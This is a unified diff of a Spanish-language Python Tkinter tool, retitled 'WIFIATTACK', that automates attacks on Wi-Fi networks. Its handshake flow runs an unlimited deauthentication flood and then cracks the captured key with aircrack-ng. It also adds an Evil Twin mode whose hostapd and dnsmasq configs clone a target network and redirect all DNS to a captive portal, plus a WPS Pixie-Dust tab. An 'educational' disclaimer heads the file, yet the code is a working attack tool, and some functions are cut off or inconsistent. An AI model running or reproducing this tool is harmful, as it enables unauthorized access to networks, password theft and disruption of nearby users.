@@ -1,3 +1,4 @@
+#WIFIATTACK
 # wifi_auditor_gui.py
 #
 # ADVERTENCIA: Este script es para fines educativos y debe ser utilizado
@@ -16,6 +17,15 @@ import csv
 from datetime import timedelta
 
 # --- Funciones de Backend (similares a la versión anterior pero adaptadas) ---
+# <--- NUEVO: Diccionario de dependencias para una fácil verificación
+REQUIRED_TOOLS = {
+    "General": ["iw", "ifconfig", "iwconfig", "systemctl"],
+    "Handshake": ["airodump-ng", "aireplay-ng", "aircrack-ng"],
+    "PMKID": ["hcxdumptool", "hcxhashtool", "hashcat"],
+    "Evil Twin": ["hostapd", "dnsmasq", "aireplay-ng"],
+    "WPS": ["reaver"]
+}
+
 
 def check_root():
     """Verifica si el script se ejecuta como root y muestra un error si no."""
@@ -25,12 +35,33 @@ def check_root():
                              "Por favor, ejecútalo con 'sudo python3 wifi_auditor_gui.py'")
         sys.exit(1)
 
+# <--- NUEVO: Función para verificar todas las herramientas necesarias
+def check_dependencies():
+    """Verifica que todas las herramientas necesarias estén instaladas."""
+    missing_tools = []
+    for category, tools in REQUIRED_TOOLS.items():
+        for tool in tools:
+            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
+                missing_tools.append(tool)
+    
+    if missing_tools:
+        messagebox.showwarning("Herramientas Faltantes",
+                               "Las siguientes herramientas no se encontraron en tu sistema. "
+                               "Por favor, instálalas para asegurar la funcionalidad completa:\n\n"
+                               f"{', '.join(missing_tools)}")
+    return not missing_tools
+
 def find_wireless_interface():
-    """Encuentra la primera interfaz inalámbrica."""
+    """Encuentra la primera interfaz inalámbrica en modo managed."""
     try:
         result = subprocess.check_output(['iw', 'dev'], stderr=subprocess.STDOUT).decode('utf-8')
         interfaces = re.findall(r'Interface\s+(\w+)', result)
-        return interfaces[0] if interfaces else None
+        for iface in interfaces:
+            # Asegurarse de que no sea una interfaz ya en modo monitor por otro proceso
+            mode_result = subprocess.check_output(['iwconfig', iface], stderr=subprocess.STDOUT).decode('utf-8')
+            if 'Mode:Managed' in mode_result:
+                return iface
+        return interfaces[0] if interfaces else None # Fallback por si no encuentra modo managed
     except Exception:
         return None
 
@@ -38,35 +69,84 @@ def set_monitor_mode(interface, log_queue):
     """Activa el modo monitor y reporta el progreso a la GUI."""
     log_queue.put(f"[*] Activando modo monitor en {interface}...")
     try:
-        subprocess.run(['ifconfig', interface, 'down'], check=True, capture_output=True)
-        subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True, capture_output=True)
-        subprocess.run(['ifconfig', interface, 'up'], check=True, capture_output=True)
-        log_queue.put(f"[+] Modo monitor activado en {interface}.")
-        return True
+        # Detener servicios que puedan interferir
+        subprocess.run(['airmon-ng', 'check', 'kill'], check=True, capture_output=True)
+        # Activar modo monitor con airmon-ng para mayor compatibilidad
+        proc = subprocess.run(['airmon-ng', 'start', interface], check=True, capture_output=True, text=True)
+        
+        # airmon-ng a menudo crea una nueva interfaz (ej. wlan0mon)
+        new_interface_match = re.search(r'monitor mode enabled on\s*(\w+)', proc.stdout)
+        if new_interface_match:
+            new_iface = new_interface_match.group(1).strip()
+            log_queue.put(f"[+] Modo monitor activado en la nueva interfaz: {new_iface}")
+            return new_iface
+        else: # Fallback al método manual si airmon-ng no reporta nueva interfaz
+            subprocess.run(['ifconfig', interface, 'down'], check=True, capture_output=True)
+            subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True, capture_output=True)
+            subprocess.run(['ifconfig', interface, 'up'], check=True, capture_output=True)
+            log_queue.put(f"[+] Modo monitor activado en {interface}.")
+            return interface
+            
     except subprocess.CalledProcessError as e:
         log_queue.put(f"[!] ERROR: No se pudo activar el modo monitor.")
-        log_queue.put(f"    Asegúrate de que tu tarjeta de red es compatible.\n    Error: {e.stderr.decode()}")
-        return False
-
+        log_queue.put(f"    Error: {e.stderr.decode() if e.stderr else 'Revisa si tu tarjeta es compatible.'}")
+        return None
+    
 def stop_monitor_mode(interface, log_queue):
     """Desactiva el modo monitor."""
     log_queue.put("[*] Desactivando modo monitor...")
     try:
-        subprocess.run(['ifconfig', interface, 'down'], check=True, capture_output=True)
-        subprocess.run(['iwconfig', interface, 'mode', 'managed'], check=True, capture_output=True)
-        subprocess.run(['ifconfig', interface, 'up'], check=True, capture_output=True)
-        # Es buena idea reiniciar el gestor de red
+        # Usar airmon-ng para detener es más fiable
+        subprocess.run(['airmon-ng', 'stop', interface], check=True, capture_output=True)
+        log_queue.put(f"[+] Modo monitor desactivado en {interface}.")
+        # Reiniciar el gestor de red para restaurar la conectividad
         subprocess.run(['systemctl', 'restart', 'NetworkManager'], check=False, capture_output=True)
-        log_queue.put("[+] Interfaz restaurada a modo normal.")
+        log_queue.put("[+] NetworkManager reiniciado.")
     except Exception as e:
         log_queue.put(f"[!] Advertencia: No se pudo restaurar la interfaz automáticamente. Puede que necesites hacerlo manualmente.")
+
+# <--- NUEVO: Funciones para crear archivos de configuración para Evil Twin
+def create_hostapd_conf(interface, essid, channel):
+    conf_path = "/tmp/hostapd.conf"
+    conf_content = (
+        f"interface={interface}\n"
+        f"driver=nl80211\n"
+        f"ssid={essid}\n"
+        f"hw_mode=g\n"
+        f"channel={channel}\n"
+        "macaddr_acl=0\n"
+        "auth_algs=1\n"
+        "ignore_broadcast_ssid=0\n"
+    )
+    with open(conf_path, 'w') as f:
+        f.write(conf_content)
+    return conf_path
+
+def create_dnsmasq_conf(interface):
+    conf_path = "/tmp/dnsmasq.conf"
+    conf_content = (
+        f"interface={interface}\n"
+        "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
+        "dhcp-option=3,10.0.0.1\n"
+        "dhcp-option=6,10.0.0.1\n"
+        "server=8.8.8.8\n"
+        "log-queries\n"
+        "log-dhcp\n"
+        "listen-address=127.0.0.1,10.0.0.1\n"
+        # Redirigir todo a nosotros mismos (para un portal cautivo)
+        "address=/#/10.0.0.1\n"
+    )
+    with open(conf_path, 'w') as f:
+        f.write(conf_content)
+    return conf_path
+
 
 # --- Clase principal de la GUI ---
 
 class WifiAuditorGUI:
     def __init__(self, root):
         self.root = root
-        self.root.title("Auditor Wi-Fi para Portafolio (Fines Educativos)")
+        self.root.title("WIFIATTACK")
         self.root.geometry("900x700")
 
         self.interface = None
@@ -74,6 +154,7 @@ class WifiAuditorGUI:
         self.stop_event = threading.Event()
         self.log_queue = queue.Queue()
         self.attack_start_time = None
+        self.active_processes = []
 
         # --- Variables de estado ---
         self.attack_status = tk.StringVar(value="Inactivo")
@@ -97,82 +178,137 @@ class WifiAuditorGUI:
 
 
     def create_widgets(self):
-        # Frame principal
         main_frame = ttk.Frame(self.root, padding="10")
         main_frame.pack(fill=tk.BOTH, expand=True)
 
-        # --- Frame de escaneo y tabla de redes ---
-        scan_frame = ttk.LabelFrame(main_frame, text="1. Escanear Redes", padding="10")
-        scan_frame.pack(fill=tk.X, pady=5)
+        # --- Frame superior (Escaneo y Tabla) ---
+        top_frame = ttk.Frame(main_frame)
+        top_frame.pack(fill=tk.X, pady=5)
 
+        scan_frame = ttk.LabelFrame(top_frame, text="1. Escanear Redes", padding="10")
+        scan_frame.pack(fill=tk.X)
         self.scan_button = ttk.Button(scan_frame, text="Escanear Redes Wi-Fi", command=self.start_scan_thread)
         self.scan_button.pack(side=tk.LEFT, padx=5)
 
-        # Tabla para mostrar redes con scrollbar
         tree_frame = ttk.Frame(main_frame)
         tree_frame.pack(fill=tk.BOTH, expand=True, pady=5)
-
-        self.tree = ttk.Treeview(tree_frame, columns=("BSSID", "Channel", "Power", "ESSID"), show="headings")
-        self.tree.heading("BSSID", text="BSSID")
-        self.tree.heading("Channel", text="Canal")
-        self.tree.heading("Power", text="Potencia")
+        self.tree = ttk.Treeview(tree_frame, columns=("BSSID", "Channel", "Power", "WPS", "ESSID"), show="headings")
+        self.tree.heading("BSSID", text="BSSID"); self.tree.column("BSSID", width=150)
+        self.tree.heading("Channel", text="Canal"); self.tree.column("Channel", width=50)
+        self.tree.heading("Power", text="Potencia"); self.tree.column("Power", width=60)
+        self.tree.heading("WPS", text="WPS"); self.tree.column("WPS", width=40)
         self.tree.heading("ESSID", text="Nombre de Red (ESSID)")
-        self.tree.column("BSSID", width=150)
-        self.tree.column("Channel", width=50)
-        self.tree.column("Power", width=60)
         self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-
         tree_scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
         tree_scrollbar.pack(side=tk.RIGHT, fill="y")
         self.tree.configure(yscrollcommand=tree_scrollbar.set)
+        
+        # --- Frame de Ataques con Pestañas ---
+        # <--- NUEVO: Uso de Notebook para organizar los ataques
+        attack_notebook = ttk.Notebook(main_frame)
+        attack_notebook.pack(fill=tk.X, pady=10)
+
+        # Crear pestañas
+        handshake_tab = ttk.Frame(attack_notebook, padding="10")
+        pmkid_tab = ttk.Frame(attack_notebook, padding="10")
+        evil_twin_tab = ttk.Frame(attack_notebook, padding="10")
+        wps_tab = ttk.Frame(attack_notebook, padding="10")
+
+        attack_notebook.add(handshake_tab, text="WPA Handshake")
+        attack_notebook.add(pmkid_tab, text="PMKID")
+        attack_notebook.add(evil_twin_tab, text="Evil Twin")
+        attack_notebook.add(wps_tab, text="WPS Pixie-Dust")
+
+        # --- Contenido de la Pestaña Handshake ---
+        ttk.Label(handshake_tab, text="Red (BSSID):").grid(row=0, column=0, sticky=tk.W)
+        self.hs_bssid = tk.StringVar()
+        ttk.Entry(handshake_tab, textvariable=self.hs_bssid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)
+        
+        ttk.Label(handshake_tab, text="Canal:").grid(row=0, column=2, sticky=tk.W)
+        self.hs_channel = tk.StringVar()
+        ttk.Entry(handshake_tab, textvariable=self.hs_channel, state="readonly", width=5).grid(row=0, column=3, padx=5)
+
+        ttk.Label(handshake_tab, text="Diccionario:").grid(row=1, column=0, pady=5, sticky=tk.W)
+        self.hs_wordlist = tk.StringVar()
+        ttk.Entry(handshake_tab, textvariable=self.hs_wordlist).grid(row=1, column=1, columnspan=3, padx=5, sticky=tk.EW)
+        ttk.Button(handshake_tab, text="Buscar...", command=lambda: self.browse_wordlist(self.hs_wordlist)).grid(row=1, column=4, padx=5)
+        ttk.Button(handshake_tab, text="INICIAR ATAQUE HANDSHAKE", command=lambda: self.start_attack("Handshake")).grid(row=2, column=0, columnspan=5, pady=10)
+        handshake_tab.columnconfigure(1, weight=1)
+
+        # --- Contenido de la Pestaña PMKID ---
+        ttk.Label(pmkid_tab, text="Red (BSSID):").grid(row=0, column=0, sticky=tk.W)
+        self.pmkid_bssid = tk.StringVar()
+        ttk.Entry(pmkid_tab, textvariable=self.pmkid_bssid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)
+
+        ttk.Label(pmkid_tab, text="Diccionario:").grid(row=1, column=0, pady=5, sticky=tk.W)
+        self.pmkid_wordlist = tk.StringVar()
+        ttk.Entry(pmkid_tab, textvariable=self.pmkid_wordlist).grid(row=1, column=1, padx=5, sticky=tk.EW)
+        ttk.Button(pmkid_tab, text="Buscar...", command=lambda: self.browse_wordlist(self.pmkid_wordlist)).grid(row=1, column=2, padx=5)
+        ttk.Button(pmkid_tab, text="INICIAR ATAQUE PMKID", command=lambda: self.start_attack("PMKID")).grid(row=2, column=0, columnspan=3, pady=10)
+        pmkid_tab.columnconfigure(1, weight=1)
+
+        # --- Contenido de la Pestaña Evil Twin ---
+        ttk.Label(evil_twin_tab, text="Red a Suplantar (ESSID):").grid(row=0, column=0, sticky=tk.W)
+        self.et_essid = tk.StringVar()
+        ttk.Entry(evil_twin_tab, textvariable=self.et_essid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)
+        
+        ttk.Label(evil_twin_tab, text="BSSID Original:").grid(row=1, column=0, sticky=tk.W)
+        self.et_bssid = tk.StringVar()
+        ttk.Entry(evil_twin_tab, textvariable=self.et_bssid, state="readonly").grid(row=1, column=1, padx=5, sticky=tk.EW)
+
+        ttk.Label(evil_twin_tab, text="Canal:").grid(row=1, column=2, sticky=tk.W)
+        self.et_channel = tk.StringVar()
+        ttk.Entry(evil_twin_tab, textvariable=self.et_channel, state="readonly", width=5).grid(row=1, column=3, padx=5)
+        ttk.Button(evil_twin_tab, text="INICIAR EVIL TWIN", command=lambda: self.start_attack("Evil Twin")).grid(row=2, column=0, columnspan=4, pady=10)
+        evil_twin_tab.columnconfigure(1, weight=1)
+
+        # --- Contenido de la Pestaña WPS ---
+        ttk.Label(wps_tab, text="Red con WPS (BSSID):").grid(row=0, column=0, sticky=tk.W)
+        self.wps_bssid = tk.StringVar()
+        ttk.Entry(wps_tab, textvariable=self.wps_bssid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)
+        ttk.Label(wps_tab, text="Nota: Selecciona una red con WPS 'Sí' en la tabla.").grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=5)
+        ttk.Button(wps_tab, text="INICIAR ATAQUE WPS", command=lambda: self.start_attack("WPS")).grid(row=2, column=0, columnspan=2, pady=10)
+        wps_tab.columnconfigure(1, weight=1)
+
         self.tree.bind("<<TreeviewSelect>>", self.on_network_select)
 
-        # --- Frame de ataque ---
-        attack_frame = ttk.LabelFrame(main_frame, text="2. Configurar Ataque", padding="10")
-        attack_frame.pack(fill=tk.X, pady=5)
-
-        ttk.Label(attack_frame, text="Red Seleccionada (BSSID):").grid(row=0, column=0, sticky=tk.W)
-        self.target_bssid = tk.StringVar()
-        ttk.Entry(attack_frame, textvariable=self.target_bssid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)
-
-        ttk.Label(attack_frame, text="Canal:").grid(row=0, column=2, sticky=tk.W)
-        self.target_channel = tk.StringVar()
-        ttk.Entry(attack_frame, textvariable=self.target_channel, state="readonly", width=5).grid(row=0, column=3, padx=5)
-
-        ttk.Label(attack_frame, text="Diccionario:").grid(row=1, column=0, pady=5, sticky=tk.W)
-        self.wordlist_path = tk.StringVar()
-        ttk.Entry(attack_frame, textvariable=self.wordlist_path).grid(row=1, column=1, columnspan=3, padx=5, sticky=tk.EW)
-        ttk.Button(attack_frame, text="Buscar...", command=self.browse_wordlist).grid(row=1, column=4, padx=5)
-
-        ttk.Label(attack_frame, text="Tipo de Ataque:").grid(row=2, column=0, pady=5, sticky=tk.W)
-        self.attack_type_combo = ttk.Combobox(attack_frame, textvariable=self.current_attack_type, 
-                                              values=["WPA Handshake", "PMKID"], state="readonly")
-        self.attack_type_combo.grid(row=2, column=1, padx=5, sticky=tk.EW)
-        self.attack_type_combo.set("WPA Handshake") # Default value
-
-        attack_frame.columnconfigure(1, weight=1)
 
         # --- Frame de control y logs ---
         control_frame = ttk.Frame(main_frame, padding="10")
         control_frame.pack(fill=tk.X)
 
-        self.start_button = ttk.Button(control_frame, text="INICIAR ATAQUE", command=self.start_attack)
-        self.start_button.pack(side=tk.LEFT, padx=10)
         self.stop_button = ttk.Button(control_frame, text="DETENER TODO", command=self.stop_attack, state=tk.DISABLED)
-        self.stop_button.pack(side=tk.LEFT)
-
+        self.stop_button.pack(side=tk.LEFT, padx=10)
         ttk.Label(control_frame, text="Estado:").pack(side=tk.LEFT, padx=(20, 5))
         ttk.Label(control_frame, textvariable=self.attack_status, font=("TkDefaultFont", 10, "bold")).pack(side=tk.LEFT)
-        
         ttk.Label(control_frame, text="Tiempo Transcurrido:").pack(side=tk.LEFT, padx=(20, 5))
         ttk.Label(control_frame, textvariable=self.elapsed_time).pack(side=tk.LEFT)
 
-
         log_frame = ttk.LabelFrame(main_frame, text="Registro de Actividad", padding="10")
         log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
-
-        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state="disabled", height=10)
+        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state="disabled", height=10, bg="black", fg="limegreen")
         self.log_text.pack(fill=tk.BOTH, expand=True)
+        
+    def on_network_select(self, event):
+        """Cuando el usuario selecciona una red, rellena los campos de todas las pestañas."""
+        selected_item = self.tree.focus()
+        if not selected_item: return
+        
+        item = self.tree.item(selected_item)
+        bssid, channel, _, wps, essid = item['values']
+        
+        # Rellenar todas las pestañas
+        self.hs_bssid.set(bssid)
+        self.hs_channel.set(channel)
+        self.pmkid_bssid.set(bssid)
+        self.et_essid.set(essid)
+        self.et_bssid.set(bssid)
+        self.et_channel.set(channel)
+        
+        if wps == "Sí":
+            self.wps_bssid.set(bssid)
+        else:
+            self.wps_bssid.set("") # Limpiar si la red no tiene WPS
 
     def log_message(self, message):
         """Añade un mensaje a la caja de texto de logs de forma segura."""
@@ -206,70 +342,67 @@ class WifiAuditorGUI:
         """Inicia el escaneo de redes en un hilo separado para no congelar la GUI."""
         self.scan_button.config(state=tk.DISABLED)
         self.update_attack_status("Escaneando redes...")
-        self.log_message("[*] Iniciando escaneo de redes durante 15 segundos...")
+        self.log_message("[*] Iniciando escaneo de redes durante 20 segundos...")
         scan_thread = threading.Thread(target=self.scan_networks)
         scan_thread.start()
 
     def scan_networks(self):
-        """Ejecuta airodump-ng para escanear y luego puebla la tabla."""
-        if not self.interface:
+        if not self.base_interface:
             self.log_queue.put("[!] No hay interfaz para escanear.")
             self.scan_button.config(state=tk.NORMAL)
-            self.update_attack_status("Inactivo")
+            self.update_attack_status("Error de Interfaz")
             return
 
-        # Limpiar la tabla anterior
-        for i in self.tree.get_children():
-            self.tree.delete(i)
-        
-        # airodump-ng puede guardar la salida en un archivo CSV, que es más fácil de parsear
-        output_prefix = "scan_result"
-        # Eliminar archivos de escaneo anteriores para evitar conflictos
-        for f in os.listdir('.'):
-            if f.startswith(output_prefix):
-                os.remove(f)
+        mon_iface = set_monitor_mode(self.base_interface, self.log_queue)
+        if not mon_iface:
+            self.scan_button.config(state=tk.NORMAL)
+            self.update_attack_status("Error al escanear")
+            return
 
-        command = ['airodump-ng', '-w', output_prefix, '--output-format', 'csv', self.interface]
+        for i in self.tree.get_children(): self.tree.delete(i)
+        
+        output_prefix = "/tmp/scan_result"
+        for f in os.listdir('/tmp/'):
+            if f.startswith("scan_result"): os.remove(f"/tmp/{f}")
+
+        command = ['airodump-ng', '-w', output_prefix, '--output-format', 'csv', '--wps', mon_iface]
         try:
             proc = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(15) # Escanea durante 15 segundos
+            time.sleep(20)
             proc.terminate()
             proc.wait()
         except FileNotFoundError:
-            self.log_queue.put("[!] ERROR: 'airodump-ng' no encontrado. ¿Está instalado y en el PATH?")
+            self.log_queue.put("[!] ERROR: 'airodump-ng' no encontrado.")
             self.scan_button.config(state=tk.NORMAL)
             self.update_attack_status("Error de herramienta")
+            stop_monitor_mode(mon_iface, self.log_queue)
             return
-
-        # Parsear el archivo CSV generado
+        
         try:
             csv_filename = f"{output_prefix}-01.csv"
-            with open(csv_filename, 'r') as f:
+            with open(csv_filename, 'r', errors='ignore') as f:
                 reader = csv.reader(f)
-                # Saltar líneas hasta encontrar la sección de Access Points
                 for row in reader:
-                    if row and "BSSID" in row[0]:
-                        break
-                # Leer los datos de los APs
+                    if row and "BSSID" in row[0]: break
                 for row in reader:
-                    if len(row) < 14 or not row[0].strip(): # Final de la sección de APs
-                        break
+                    if len(row) < 14 or not row[0].strip(): break
                     bssid = row[0].strip()
                     power = row[8].strip()
                     channel = row[3].strip()
+                    encryption = row[5].strip()
+                    wps = "Sí" if "WPS" in encryption else "No"
                     essid = row[13].strip()
-                    self.tree.insert("", "end", values=(bssid, channel, power, essid))
-            self.log_queue.put("[+] Escaneo completado. Selecciona una red de la lista.")
-            self.update_attack_status("Escaneo completado")
+                    if essid:
+                        self.tree.insert("", "end", values=(bssid, channel, power, wps, essid))
+            self.log_queue.put("[+] Escaneo completado. Selecciona una red.")
         except FileNotFoundError:
-            self.log_queue.put("[!] No se generó el archivo de escaneo. Revisa los permisos o si la tarjeta está en modo monitor.")
-            self.update_attack_status("Error de escaneo")
+            self.log_queue.put("[!] No se generó el archivo de escaneo.")
         except Exception as e:
             self.log_queue.put(f"[!] Error al leer el resultado del escaneo: {e}")
-            self.update_attack_status("Error de escaneo")
         finally:
             self.scan_button.config(state=tk.NORMAL)
-
+            self.update_attack_status("Escaneo completado")
+            stop_monitor_mode(mon_iface, self.log_queue)
 
     def on_network_select(self, event):
         """Cuando el usuario selecciona una red, rellena los campos de ataque."""
@@ -287,45 +420,73 @@ class WifiAuditorGUI:
         if filepath:
             self.wordlist_path.set(filepath)
 
-    def start_attack(self):
-        """Valida los datos e inicia el hilo de ataque."""
-        bssid = self.target_bssid.get()
-        channel = self.target_channel.get()
-        wordlist = self.wordlist_path.get()
-        attack_type = self.current_attack_type.get()
-
-        if not all([bssid, channel, wordlist]):
-            messagebox.showwarning("Faltan Datos", "Debes seleccionar una red y un archivo de diccionario para continuar.")
-            return
-        
-        if attack_type == "PMKID":
-            # Check for hcxdumptool and hcxhashtool
-            if not (self.check_tool_exists("hcxdumptool") and self.check_tool_exists("hcxhashtool") and self.check_tool_exists("hashcat")):
-                messagebox.showerror("Herramientas Faltantes", 
-                                     "Para ataques PMKID, necesitas 'hcxdumptool', 'hcxhashtool' y 'hashcat' instalados y en tu PATH.")
+    def start_attack(self, attack_type):
+        # Validaciones
+        if attack_type == "Handshake":
+            if not all([self.hs_bssid.get(), self.hs_channel.get(), self.hs_wordlist.get()]):
+                messagebox.showwarning("Faltan Datos", "Selecciona una red y un diccionario.")
                 return
-
+        elif attack_type == "PMKID":
+            if not all([self.pmkid_bssid.get(), self.pmkid_wordlist.get()]):
+                messagebox.showwarning("Faltan Datos", "Selecciona una red y un diccionario.")
+                return
+        elif attack_type == "Evil Twin":
+            if not all([self.et_bssid.get(), self.et_essid.get(), self.et_channel.get()]):
+                messagebox.showwarning("Faltan Datos", "Selecciona una red de la lista.")
+                return
+        elif attack_type == "WPS":
+            if not self.wps_bssid.get():
+                messagebox.showwarning("Faltan Datos", "Selecciona una red con WPS activado.")
+                return
+        
         self.stop_event.clear()
-        self.start_button.config(state=tk.DISABLED)
         self.stop_button.config(state=tk.NORMAL)
         self.scan_button.config(state=tk.DISABLED)
         self.attack_start_time = time.time()
-        self.update_elapsed_time() # Iniciar el contador de tiempo
+        self.update_elapsed_time()
 
-        # Iniciar el hilo de ataque
-        if attack_type == "WPA Handshake":
-            self.attack_thread = threading.Thread(target=self.run_handshake_attack_sequence, args=(bssid, channel, wordlist))
-        elif attack_type == "PMKID":
-            self.attack_thread = threading.Thread(target=self.run_pmkid_attack_sequence, args=(bssid, channel, wordlist))
-        
+        # Seleccionar la función de ataque correcta
+        target_function = {
+            "Handshake": self.run_handshake_attack_sequence,
+            "PMKID": self.run_pmkid_attack_sequence,
+            "Evil Twin": self.run_evil_twin_sequence,
+            "WPS": self.run_wps_attack_sequence
+        }[attack_type]
+
+        self.attack_thread = threading.Thread(target=target_function)
         self.attack_thread.start()
 
     def stop_attack(self):
-        """Señala al hilo de ataque que debe detenerse."""
         self.log_message("[!] Solicitud de detención enviada. Limpiando...")
         self.stop_event.set()
         self.stop_button.config(state=tk.DISABLED)
         self.update_attack_status("Deteniendo...")
+        # <--- NUEVO: Detener todos los procesos activos
+        for proc in self.active_processes:
+            try:
+                proc.terminate()
+            except ProcessLookupError:
+                pass # El proceso ya terminó
+        self.active_processes.clear()
+
+    #NUEVO: Funciones para crear archivos de configuración para Evil Twin
+    def attack_finished(self):
+        """Reactiva los botones y resetea el estado cuando el ataque termina."""
+        self.stop_button.config(state=tk.DISABLED)
+        self.scan_button.config(state=tk.NORMAL)
+        self.attack_start_time = None
+        if "ÉXITO" not in self.attack_status.get() and "Error" not in self.attack_status.get() and "detenido" not in self.attack_status.get():
+            self.update_attack_status("Inactivo")
+        self.elapsed_time.set("00:00:00")
+
+    def on_closing(self):
+        """Maneja el cierre de la ventana."""
+        self.stop_event.set()
+        if self.attack_thread and self.attack_thread.is_alive():
+            self.attack_thread.join(timeout=5)
+        if self.monitor_interface:
+            stop_monitor_mode(self.monitor_interface, self.log_queue)
+        self.root.destroy()
 
     def check_tool_exists(self, tool_name):
         """Verifica si una herramienta específica existe en el PATH."""
@@ -336,92 +497,65 @@ class WifiAuditorGUI:
         Esta es la función principal que se ejecuta en el hilo separado para ataque WPA Handshake.
         Orquesta toda la secuencia de ataque.
         """
+        bssid = self.hs_bssid.get()
+        channel = self.hs_channel.get()
+        wordlist = self.hs_wordlist.get()
+
         self.update_attack_status("Activando modo monitor...")
-        # 1. Poner la interfaz en modo monitor
-        if not set_monitor_mode(self.interface, self.log_queue):
+        self.monitor_interface = set_monitor_mode(self.base_interface, self.log_queue)
+        if not self.monitor_interface or self.stop_event.is_set():
             self.attack_finished()
             return
         
-        capture_file = None
-        airodump_proc = None
-        aireplay_proc = None
-        
         try:
-            # 2. Iniciar la captura y la desautenticación automática
             self.log_queue.put("\n--- FASE 1: Capturando Handshake ---")
-            self.log_queue.put(f"[*] Escuchando en BSSID {bssid} en el canal {channel}...")
             self.update_attack_status("Buscando Handshake...")
+            capture_file = f"/tmp/{bssid.replace(':', '')}_capture"
             
-            capture_prefix = "capture"
-            for f in os.listdir('.'):
-                if f.startswith(capture_prefix):
-                    os.remove(f)
-
-            # Comando para capturar
-            airodump_cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', capture_prefix, self.interface]
+            airodump_cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', capture_file, self.monitor_interface]
             airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            self.active_processes.append(airodump_proc)
 
-            # Comando para desautenticar en bucle
-            self.log_queue.put("[*] Iniciando desautenticación automática para acelerar la captura...")
-            aireplay_cmd = ['aireplay-ng', '--deauth', '0', '-a', bssid, self.interface] # 0 = infinito
+            aireplay_cmd = ['aireplay-ng', '--deauth', '0', '-a', bssid, self.monitor_interface]
             aireplay_proc = subprocess.Popen(aireplay_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.active_processes.append(aireplay_proc)
             
-            # 3. Monitorear hasta capturar el handshake o hasta que el usuario detenga
             handshake_found = False
             while not handshake_found and not self.stop_event.is_set():
                 line = airodump_proc.stdout.readline()
-                if not line:
-                    break
-                self.log_queue.put(line.strip()) # Opcional: mostrar toda la salida de airodump
+                if not line: break
                 if "WPA handshake:" in line:
                     self.log_queue.put("\n[+] ¡HANDSHAKE CAPTURADO!\n")
-                    self.update_attack_status("Handshake Capturado. Crackeando...")
                     handshake_found = True
-                    capture_file = f"{capture_prefix}-01.cap"
                 time.sleep(0.1)
 
-        finally:
-            # Detener siempre los subprocesos
-            if airodump_proc: airodump_proc.terminate()
-            if aireplay_proc: aireplay_proc.terminate()
-            
-        # 4. Iniciar el ataque de diccionario si se capturó el handshake
-        if capture_file and os.path.exists(capture_file) and not self.stop_event.is_set():
-            self.log_queue.put("\n--- FASE 2: Crackeando Contraseña ---")
-            self.log_queue.put(f"[*] Iniciando ataque de diccionario con '{wordlist}'...")
-            self.update_attack_status("Crackeando Handshake...")
-            
-            aircrack_cmd = ['aircrack-ng', '-w', wordlist, '-b', bssid, capture_file]
-            try:
-                result = subprocess.check_output(aircrack_cmd, text=True)
-                self.log_queue.put("\n--- Resultados del Ataque ---")
-                self.log_queue.put(result)
-                if "KEY FOUND!" in result:
-                     password = re.search(r'KEY FOUND!\s+\[\s*(.*)\s*\]', result)
-                     self.log_queue.put("==========================================")
-                     self.log_queue.put(f"    ¡ÉXITO! Contraseña encontrada: {password.group(1)}")
-                     self.log_queue.put("==========================================")
-                     self.update_attack_status(f"ÉXITO: {password.group(1)}")
+            # Detener captura y deauth
+            aireplay_proc.terminate(); airodump_proc.terminate()
+            self.active_processes.clear()
+
+            if handshake_found and not self.stop_event.is_set():
+                self.log_queue.put("\n--- FASE 2: Crackeando Contraseña ---")
+                self.update_attack_status("Crackeando Handshake...")
+                
+                aircrack_cmd = ['aircrack-ng', '-w', wordlist, '-b', bssid, f"{capture_file}-01.cap"]
+                result = subprocess.run(aircrack_cmd, capture_output=True, text=True)
+                
+                self.log_queue.put(result.stdout)
+                if "KEY FOUND!" in result.stdout:
+                     password = re.search(r'KEY FOUND!\s+\[\s*(.*)\s*\]', result.stdout).group(1)
+                     self.log_queue.put(f"\n[*****] ¡ÉXITO! Contraseña: {password} [*****]\n")
+                     self.update_attack_status(f"ÉXITO: {password}")
                 else:
                     self.log_queue.put("[!] Contraseña no encontrada en el diccionario.")
                     self.update_attack_status("Contraseña no encontrada")
-            except subprocess.CalledProcessError as e:
-                # Aircrack-ng a menudo sale con error si no encuentra la clave
-                self.log_queue.put(e.output) # Muestra la salida de todas formas
-                if "KEY FOUND!" not in e.output:
-                    self.log_queue.put("[!] Contraseña no encontrada en el diccionario.")
-                    self.update_attack_status("Contraseña no encontrada")
+            elif not self.stop_event.is_set():
+                self.log_queue.put("[!] No se pudo capturar el handshake.")
+                self.update_attack_status("Fallo al capturar Handshake")
 
-        elif self.stop_event.is_set():
-            self.log_queue.put("[*] El ataque fue detenido por el usuario.")
-            self.update_attack_status("Ataque detenido")
-        else:
-            self.log_queue.put("[!] No se pudo capturar el handshake.")
-            self.update_attack_status("Fallo al capturar Handshake")
-
-        # 5. Limpieza final
-        stop_monitor_mode(self.interface, self.log_queue)
-        self.attack_finished()
+        finally:
+            stop_monitor_mode(self.monitor_interface, self.log_queue)
+            self.attack_finished()
+            self.monitor_interface = None
 
     def run_pmkid_attack_sequence(self, bssid, channel, wordlist):
         """
@@ -559,27 +693,195 @@ class WifiAuditorGUI:
         stop_monitor_mode(self.interface, self.log_queue)
         self.attack_finished()
 
-    def attack_finished(self):
